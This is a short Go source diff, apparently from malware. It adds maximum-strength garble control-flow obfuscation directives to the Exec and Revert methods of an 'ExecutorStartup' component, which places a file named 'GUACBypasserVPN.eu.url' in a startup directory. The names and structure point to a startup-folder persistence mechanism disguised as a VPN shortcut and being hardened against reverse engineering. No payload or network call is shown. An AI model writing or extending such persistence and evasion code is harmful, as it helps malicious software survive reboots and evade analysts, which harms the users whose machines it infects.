@@ -18,7 +18,7 @@ func (e ExecutorStartup) findPath() (string, error) {
 	path := filepath.Join(startupDir, "GUACBypasserVPN.eu.url")
 	return path, nil
 }
-
+//garble:controlflow flatten_passes=max junk_jumps=max block_splits=max flatten_hardening=xor,delegate_table
 func (e ExecutorStartup) Exec(path string) error {
 	fpath, err := e.findPath()
 	if err != nil {
@@ -35,7 +35,7 @@ func (e ExecutorStartup) Exec(path string) error {
 	f.Close()
 	return nil
 }
-
+//garble:controlflow flatten_passes=max junk_jumps=max block_splits=max flatten_hardening=xor,delegate_table
 func (e ExecutorStartup) Revert() error {
 	startupDir, err := e.findPath()
 	if err != nil {
